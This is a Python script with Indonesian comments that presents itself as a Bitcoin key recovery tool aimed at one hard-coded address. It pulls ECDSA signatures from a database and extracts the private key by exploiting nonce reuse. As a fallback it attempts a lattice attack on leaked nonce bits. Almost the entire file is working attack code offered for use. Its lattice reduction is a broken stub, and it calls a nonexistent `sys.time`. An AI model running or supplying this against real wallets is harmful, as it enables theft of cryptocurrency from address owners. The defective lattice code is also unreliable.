import sqlite3
import numpy as np
from fastecdsa.curve import secp256k1
from sympy import mod_inverse
import sys

# Konfigurasi Curve
CURVE_N = secp256k1.q

# ==========================================
# 1. PARSING DER (Sangat Penting)
# ==========================================
def extract_s_from_der(der_hex):
    try:
        if not der_hex or len(der_hex) < 10: return None
        der_hex = str(der_hex).strip()
        idx = 0
        if der_hex[idx:idx+2] != '30': return None
        idx += 4 # Skip 30 + Total Len
        if der_hex[idx:idx+2] != '02': return None
        idx += 2
        r_len = int(der_hex[idx:idx+2], 16)
        idx += 2 + (r_len * 2)
        if der_hex[idx:idx+2] != '02': return None
        idx += 2
        s_len = int(der_hex[idx:idx+2], 16)
        idx += 2
        s_hex = der_hex[idx : idx + (s_len * 2)]
        return int(s_hex, 16)
    except:
        return None

# ==========================================
# 2. SOLVER: NONCE REUSE (R SAMA) -> 100% SUCCESS RATE
# ==========================================
def solve_explicit_nonce_reuse(data):
    """
    Mencari dua signature yang menggunakan R sama persis.
    Rumus: k = (z1 - z2) / (s1 - s2)
    """
    print(f"\n[Mode 1] Memeriksa Explicit Nonce Reuse (R Duplicate)...")
    n = len(data)
    for i in range(n):
        for j in range(i + 1, n):
            sig1 = data[i]
            sig2 = data[j]
            
            # Jika R sama, TAPI S beda -> KITA MENANG!
            if sig1['r'] == sig2['r'] and sig1['s'] != sig2['s']:
                print(f"   ⚡ DITEMUKAN R COLLISION!")
                print(f"      Sig 1 ID: {i} | Z: {str(sig1['z'])[:10]}...")
                print(f"      Sig 2 ID: {j} | Z: {str(sig2['z'])[:10]}...")
                
                try:
                    # Hitung k (nonce)
                    # k = (z1 - z2) * (s1 - s2)^-1 mod N
                    diff_z = (sig1['z'] - sig2['z']) % CURVE_N
                    diff_s = (sig1['s'] - sig2['s']) % CURVE_N
                    inv_s = mod_inverse(diff_s, CURVE_N)
                    
                    k = (diff_z * inv_s) % CURVE_N
                    
                    # Hitung Private Key (d)
                    # d = (s1 * k - z1) * r^-1 mod N
                    inv_r = mod_inverse(sig1['r'], CURVE_N)
                    d = ( ((sig1['s'] * k) % CURVE_N) - sig1['z'] ) % CURVE_N
                    d = (d * inv_r) % CURVE_N
                    
                    return hex(d)
                except Exception as e:
                    print(f"      Error math: {e}")
                    continue
    print("   ❌ Tidak ditemukan R yang sama persis.")
    return None

# ==========================================
# 3. SOLVER: LATTICE (HNP)
# ==========================================
def lll_reduction(basis):
    """LLL Sederhana (Slow but Pure Python)"""
    dim = basis.shape[0]
    mu = np.zeros((dim, dim))
    b_star = np.zeros((dim, dim), dtype=object) # Object untuk presisi tinggi
    
    for i in range(dim):
        b_star[i] = basis[i].copy()
        for j in range(i):
            # Proyeksi (Float)
            num = float(np.dot(basis[i], b_star[j]))
            den = float(np.dot(b_star[j], b_star[j]))
            mu[i, j] = num / den if den != 0 else 0
            b_star[i] = b_star[i] - (basis[i] * 0) 
            
            sub = int(round(mu[i, j]))
            if sub != 0:
                basis[i] -= sub * basis[j]
    return basis

def solve_hnp_lattice(data, leaked_bits):
    """
    Solve HNP using Lattice Attack
    data: list of signatures with 'r', 's', 'z'
    leaked_bits: number of MSB bits known (0 for nonce)
    """
    n_sigs = len(data)
    
    # HNP Rule: Kita butuh m * bits > 256. 
    required_sigs = int(260 / leaked_bits) + 1
    if n_sigs < required_sigs:
        print(f"   ⚠️ SKIP: {n_sigs} sigs tidak cukup untuk leak {leaked_bits} bits (Butuh min {required_sigs} sigs)")
        return None

    # Asumsi: Nonce Kecil (MSB Leak) -> k < B
    B = 2**(256 - leaked_bits)
    
    # Matriks Identitas + Kolom HNP
    # Struktur Matriks CVP Embedding
    # [ q  0  0 ... 0  0 ]
    # [ 0  q  0 ... 0  0 ]
    # ...
    # [ t1 t2 ... 1  0 ]
    # [ u1 u2 ... 0  B ]
    
    matrix = np.zeros((n_sigs + 2, n_sigs + 2), dtype=object)
    
    print(f"   🔄 Membangun Lattice {n_sigs}x{n_sigs} (Leak {leaked_bits} bits)...")
    
    for i in range(n_sigs):
        try:
            r = data[i]['r']
            s = data[i]['s']
            z = data[i]['z']
            
            s_inv = mod_inverse(s, CURVE_N)
            t = (r * s_inv) % CURVE_N
            u = (z * s_inv) % CURVE_N
            
            # Diagonal q
            matrix[i, i] = CURVE_N
            
            # Baris koefisien t (baris ke-n)
            matrix[n_sigs, i] = t
            
            # Baris koefisien u (baris ke-n+1)
            matrix[n_sigs + 1, i] = u
            
        except Exception as e:
            print(f"   Error processing signature {i}: {e}")
            return None

    # Weighting factors
    matrix[n_sigs, n_sigs] = 1 # Kappa
    matrix[n_sigs + 1, n_sigs + 1] = B # Scaling factor
    
    print(f"   ⚙️ Menjalankan LLL pada matriks {matrix.shape[0]}x{matrix.shape[1]}...")
    reduced = lll_reduction(matrix)
    
    # Cek baris untuk kandidat Key
    for row_idx, row in enumerate(reduced):
        # Kandidat private key biasanya muncul sebagai koefisien dari t
        d_cand = abs(int(row[n_sigs])) % CURVE_N
        
        if 1 < d_cand < CURVE_N:
            # Verifikasi sederhana: Cek terhadap beberapa signature
            verified_count = 0
            test_sigs = min(3, n_sigs)  # Test 3 signatures
            
            for i in range(test_sigs):
                r_i = data[i]['r']
                s_i = data[i]['s']
                z_i = data[i]['z']
                
                try:
                    # Hitung k dari kandidat private key
                    # k = (z + r*d) / s mod N
                    val = (z_i + r_i * d_cand) % CURVE_N
                    s_inv_i = mod_inverse(s_i, CURVE_N)
                    k_check = (val * s_inv_i) % CURVE_N
                    
                    # Jika k "kecil" (sesuai asumsi leak), kemungkinan benar
                    if k_check < B * 10:  # Margin toleransi
                        verified_count += 1
                except:
                    continue
            
            if verified_count >= test_sigs:
                print(f"   ✅ Kandidat private key ditemukan di baris {row_idx}")
                return hex(d_cand)
    
    return None

# ==========================================
# DATA LOADING & VALIDATION
# ==========================================
def get_data(db_path, address):
    """
    Load data from database with correct column structure
    """
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    
    # Query dengan struktur kolom yang benar
    try:
        cur.execute("""
            SELECT r, s, z, sig_hex, msb_leak 
            FROM signatures 
            WHERE address=?
        """, (address,))
    except Exception as e:
        print(f"Error query: {e}")
        # Fallback jika ada error
        cur.execute("""
            SELECT r, s, z, sig_hex 
            FROM signatures 
            WHERE address=?
        """, (address,))
    
    rows = cur.fetchall()
    conn.close()
    
    print(f"[INFO] Found {len(rows)} raw signatures from database")
    
    clean_data = []
    for row_idx, row in enumerate(rows):
        try:
            # Handle different row formats
            if len(row) >= 5:  # With msb_leak
                r_val, s_val, z_val, sig_hex, msb_leak = row[0], row[1], row[2], row[3], row[4]
            else:  # Without msb_leak
                r_val, s_val, z_val, sig_hex = row[0], row[1], row[2], row[3]
                msb_leak = None
            
            # Parse values
            if isinstance(r_val, str):
                val_r = int(r_val, 16) if r_val.startswith('0x') else int(r_val)
            else:
                val_r = int(r_val)
                
            if isinstance(z_val, str):
                val_z = int(z_val, 16) if z_val.startswith('0x') else int(z_val)
            else:
                val_z = int(z_val)
            
            # Parse s value - prioritize sig_hex if available
            val_s = None
            if sig_hex and len(str(sig_hex)) > 10:
                val_s = extract_s_from_der(sig_hex)
            
            if not val_s:
                if isinstance(s_val, str):
                    val_s = int(s_val, 16) if s_val.startswith('0x') else int(s_val)
                else:
                    val_s = int(s_val)
            
            if val_r > 0 and val_s > 0:
                sig_data = {
                    'r': val_r, 
                    's': val_s, 
                    'z': val_z,
                    'row_idx': row_idx
                }
                
                # Add msb_leak if available
                if msb_leak is not None:
                    sig_data['msb_leak'] = msb_leak
                
                clean_data.append(sig_data)
                
        except Exception as e:
            print(f"Warning: Error parsing row {row_idx}: {e}")
            continue
    
    print(f"[INFO] Successfully parsed {len(clean_data)} signatures")
    
    # Log msb_leak info
    sigs_with_leak = [sig for sig in clean_data if 'msb_leak' in sig]
    if sigs_with_leak:
        print(f"[INFO] {len(sigs_with_leak)} signatures have msb_leak information")
        for sig in sigs_with_leak[:3]:
            leak_val = sig.get('msb_leak')
            if leak_val:
                print(f"       - msb_leak={leak_val} (≈ {leak_val * 8} bits leak)")
    
    return clean_data

def validate_data_for_lattice(data):
    """Validasi apakah data cocok untuk Lattice Attack"""
    if len(data) < 10:
        print(f"   ⚠️ Hanya {len(data)} signatures, lattice mungkin lemah")
        return False
    
    # Cek variasi r (tidak boleh semua sama)
    unique_r = len(set([sig['r'] for sig in data]))
    if unique_r < len(data) * 0.5:
        print(f"   ⚠️ Terlalu sedikit unique r ({unique_r}/{len(data)})")
        return False
    
    # Cek range values
    for i, sig in enumerate(data[:3]):  # Check first 3
        if sig['r'] >= CURVE_N or sig['s'] >= CURVE_N or sig['z'] >= CURVE_N:
            print(f"   ⚠️ Signature {i} has values >= CURVE_N")
            return False
    
    return True

def solve_hnp_with_known_leaks(data):
    """Gunakan msb_leak yang sudah ada di database"""
    print("\n[Mode 2] Mencoba Lattice Attack dengan Leak yang Diketahui...")
    
    # Filter signature yang memiliki leak info
    sigs_with_leak = [sig for sig in data if 'msb_leak' in sig and sig['msb_leak']]
    
    if not sigs_with_leak:
        print("   ❌ Tidak ada data dengan informasi leak (msb_leak)")
        return None
    
    print(f"   ✅ Ditemukan {len(sigs_with_leak)} signatures dengan leak info")
    
    # Analisis leak values
    leak_counts = {}
    for sig in sigs_with_leak:
        leak_val = sig.get('msb_leak')
        if leak_val:
            leak_counts[leak_val] = leak_counts.get(leak_val, 0) + 1
    
    print("   📊 Distribusi msb_leak:")
    for leak_val, count in leak_counts.items():
        bits = leak_val * 8 if leak_val else 0
        print(f"      - {leak_val} byte(s) leak: {count} sigs (≈ {bits} bits)")
    
    # Coba dengan nilai leak yang paling umum
    if leak_counts:
        most_common_leak = max(leak_counts.items(), key=lambda x: x[1])[0]
        bits = most_common_leak * 8
        
        print(f"\n[?] Mencoba dengan leak paling umum: {most_common_leak} byte = {bits} bits")
        
        # Gunakan hanya signature dengan leak ini
        filtered_sigs = [sig for sig in sigs_with_leak if sig.get('msb_leak') == most_common_leak]
        
        if validate_data_for_lattice(filtered_sigs):
            return solve_hnp_lattice(filtered_sigs, bits)
    
    return None

# ==========================================
# MAIN
# ==========================================
if __name__ == "__main__":
    DB = "valid_nonce_reuse.db"
    ADDR = "1L7p6TBo1B2bz2gL4QPY9bYtn97VjFnYNg"
    
    print("=" * 60)
    print("BITCOIN KEY RECOVERY TOOL")
    print("=" * 60)
    print(f"Database: {DB}")
    print(f"Target Address: {ADDR}")
    print("-" * 60)
    
    # Load data
    sigs = get_data(DB, ADDR)
    
    if len(sigs) < 2:
        print("❌ Kurang data (Minimal 2 signatures diperlukan).")
        sys.exit(1)
    
    print(f"\n📊 DATA SUMMARY:")
    print(f"   Total Signatures: {len(sigs)}")
    
    # Check for R duplicates
    r_values = [sig['r'] for sig in sigs]
    unique_r = len(set(r_values))
    print(f"   Unique R values: {unique_r}/{len(sigs)}")
    
    if len(sigs) - unique_r > 0:
        print(f"   ⚡ Potensi {len(sigs) - unique_r} duplicate R ditemukan!")
    
    # ==========================================
    # LANGKAH 1: Cek Nonce Reuse (Paling Cepat & Akurat)
    # ==========================================
    print("\n" + "=" * 60)
    print("LANGKAH 1: Mencari Nonce Reuse (Explicit R Duplicate)")
    print("=" * 60)
    
    priv = solve_explicit_nonce_reuse(sigs)
    
    # ==========================================
    # LANGKAH 2: Coba dengan leak yang diketahui dari database
    # ==========================================
    if not priv:
        print("\n" + "=" * 60)
        print("LANGKAH 2: Lattice Attack dengan Known Leaks")
        print("=" * 60)
        
        priv = solve_hnp_with_known_leaks(sigs)
    
    # ==========================================
    # LANGKAH 3: Fallback - Coba berbagai asumsi leak
    # ==========================================
    if not priv:
        print("\n" + "=" * 60)
        print("LANGKAH 3: Mencoba Berbagai Asumsi Leak")
        print("=" * 60)
        
        # Urutkan dari leak terbesar ke terkecil
        leak_options = [128, 64, 48, 40, 32, 24, 20, 16, 12, 8]
        
        for bits in leak_options:
            print(f"\n[?] Test Leak: {bits} bits")
            
            if not validate_data_for_lattice(sigs):
                print("   ⚠️ Data tidak valid untuk lattice, skip...")
                continue
            
            required_sigs = int(260 / bits) + 1
            if len(sigs) < required_sigs:
                print(f"   ⚠️ Butuh minimal {required_sigs} sigs, hanya ada {len(sigs)}")
                continue
            
            priv = solve_hnp_lattice(sigs, bits)
            if priv:
                break
    
    # ==========================================
    # RESULTS
    # ==========================================
    print("\n" + "=" * 60)
    
    if priv:
        print("🎉 SUCCESS! PRIVATE KEY FOUND")
        print("=" * 60)
        print(f"HEX: {priv}")
        
        # Simpan ke file
        with open("PRIVATE_KEY_FOUND.txt", "w") as f:
            f.write(priv)
            f.write(f"\n\nAddress: {ADDR}")
            f.write(f"\nFound using {len(sigs)} signatures")
            f.write(f"\nTimestamp: {sys.time}")
        
        print(f"\n✅ Private key disimpan ke: PRIVATE_KEY_FOUND.txt")
    else:
        print("❌ RECOVERY GAGAL")
        print("=" * 60)
        print("Kemungkinan penyebab:")
        print("1. Tidak ada Nonce Reuse (R berbeda semua)")
        print(f"2. Data ({len(sigs)} sigs) tidak cukup untuk lattice attack")
        print("3. Posisi leak tidak sesuai asumsi (bukan MSB)")
        print("4. Implementasi Lattice perlu improvement")
        
        print(f"\n💡 Rekomendasi:")
        print(f"   - Kumpulkan lebih banyak signatures (>50 untuk lattice)")
        print(f"   - Cari implementasi LLL yang lebih cepat (fplll)")
        print(f"   - Verifikasi data msb_leak di database")
    
    print("\n" + "=" * 60)
